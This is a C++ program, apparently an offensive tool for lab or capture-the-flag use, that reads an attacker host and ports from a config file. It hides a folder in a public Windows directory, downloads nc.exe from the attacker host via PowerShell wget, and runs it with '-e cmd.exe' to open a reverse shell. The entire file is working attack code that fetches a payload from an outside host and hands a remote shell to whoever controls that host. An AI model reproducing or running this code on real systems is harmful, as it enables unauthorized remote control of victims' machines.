#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <sstream>
#include <sys/types.h>
#include <sys/stat.h>

bool directory_exists(std::string path) {
  struct stat info;
  if (stat(path.c_str(), &info) != 0)
    return false;
  else if (info.st_mode & S_IFDIR)
    return true;
  else
    return false;
}

std::vector<std::string> split(const std::string& s, char delim) {
  std::vector<std::string> result;
  std::stringstream ss(s);
  std::string item;

  while (std::getline(ss, item, delim)) {
    result.push_back(item);
  }

  return result;
}

int main(int argc, char* argv[]) {
  // Read attacker host and attacker port from pheelbert.ini
  // attacker_host=10.10.14.3
  // attacker_file_transfer_port=8080
  // attacker_reverse_shell_port=9001
  std::string config_file = "pheelbert.ini";
  std::string ATTACKER_HOST_KEY = "attacker_host";
  std::string ATTACKER_FILE_TRANSFER_PORT_KEY = "attacker_file_transfer_port";
  std::string ATTACKER_REVERSE_SHELL_PORT_KEY = "attacker_reverse_shell_port";
  std::string attacker_host;
  std::string attacker_file_transfer_port;
  std::string attacker_reverse_shell_port;
  std::ifstream file(config_file);
  if (file.is_open()) {
    std::string line;
    while (std::getline(file, line)) {
      std::vector<std::string> key_value = split(line, '=');
      std::string key = key_value[0];
      std::string value = key_value[1];
      if (key == ATTACKER_HOST_KEY) {
        attacker_host = value;
      } else if (key == ATTACKER_FILE_TRANSFER_PORT_KEY) {
        attacker_file_transfer_port = value;
      } else if (key == ATTACKER_REVERSE_SHELL_PORT_KEY) {
        attacker_reverse_shell_port = value;
      }
    }
    file.close();
  }

  // Find out which output directory is write-able
  std::string create_directory_path;
  std::vector<std::string> public_directories = {
    "C:\\Windows\\Temp\\",
    "C:\\Users\\Public\\Documents\\"
  };
  std::string hidden_folder_name = ".pheelbert";
  for (std::string public_directory : public_directories) {
    create_directory_path = public_directory + hidden_folder_name;
    if (!directory_exists(create_directory_path)) {
      std::string create_directory_command = "mkdir " + create_directory_path;
      int create_directory_rc = system(create_directory_command.c_str());
      if (create_directory_rc == 0) {
        break;
      }
    }
  }

  // Download nc.exe to the victim host
  std::string nc_output_path = create_directory_path + "\\nc.exe";
  std::string download_nc_command = "powershell -command wget http://" + attacker_host + ":" + attacker_file_transfer_port + "/nc.exe -O " + nc_output_path;
  int download_nc_rc = system(download_nc_command.c_str());

  // Run nc.exe on the victim host
  std::string run_nc_command = nc_output_path + " " + attacker_host + " " + attacker_reverse_shell_port + " -e cmd.exe";
  int run_nc_rc = system(run_nc_command.c_str());
}